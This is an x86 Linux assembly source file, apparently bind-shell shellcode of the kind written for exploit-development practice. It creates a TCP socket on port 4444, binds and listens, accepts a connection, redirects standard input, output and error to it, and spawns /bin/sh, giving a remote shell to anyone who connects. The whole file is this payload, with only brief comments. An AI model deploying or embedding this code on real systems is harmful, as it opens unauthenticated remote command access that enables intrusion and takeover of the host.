global _start

section .text
  _start:
    ; set the frame pointer
    mov   ebp, esp

    ; clear required registers
    xor   eax, eax
    xor   ebx, ebx
    xor   ecx, ecx
    xor   edx, edx

    ; create sockaddr_in struct
    push  eax
    push  eax         ; [$esp]: 8 bytes of padding
    push  eax         ; [$esp]: 0
    push  word 0x5c11 ; [$esp]: 4444
    push  word 0x02   ; [$esp]: AF_INET

    ; call socket(domain, type, protocol)
    mov   ax, 0x167   ; $eax: 0x167 / 359
    mov   bl, 0x02    ; $ebx: AF_INET
    mov   cl, 0x01    ; $ecx: SOCK_STREAM
    int   0x80
    mov   edi, eax    ; $edi: socket file descriptor

    ; call bind(sockfd, addr, addrlen)
    xor   eax, eax
    mov   ax, 0x169   ; $eax: 0x169 / 361
    mov   ebx, edi    ; $ebx: sockfd
    mov   ecx, esp    ; $ecx: pointer to sockaddr struct
    mov   edx, ebp
    sub   edx, esp    ; $edx: size of the sockaddr struct
    int   0x80

    ; call listen(sockfd, backlog)
    xor   eax, eax
    mov   ax, 0x16b   ; $eax: 0x16b / 363
    mov   ebx, edi    ; $ebx: sockfd
    xor   ecx, ecx    ; $ecx: 0
    int   0x80

    ; call accept4(sockfd, *addr, *addrlen, flags)
    xor   eax, eax
    mov   ax, 0x16c   ; $eax: 0x16c / 364
    mov   ebx, edi    ; $ebx: sockfd
    xor   ecx, ecx    ; $ecx: NULL
    xor   edx, edx    ; $edx: NULL
    xor   esi, esi    ; $esi: 0
    int   0x80
    mov   esi, eax    ; $esi: connection file descriptor

    ; call dup2 to redirect STDIN, STDOUT and STDERR
    mov   cl, 0x3
    dup:
    xor   eax, eax
    mov   al, 0x3f
    mov   ebx, esi    ; $ebx: connection file descriptor
    dec   ecx
    int   0x80
    inc   ecx
    loop  dup

    ; spawn /bin/sh using execve
    ; $ecx and $edx are 0 at this point
    xor   eax, eax
    push  eax
    push  0x68732f2f
    push  0x6e69622f
    mov   ebx, esp    ; [$ebx]: null terminated /bin//sh
    mov   al, 0x0b
    int   0x80
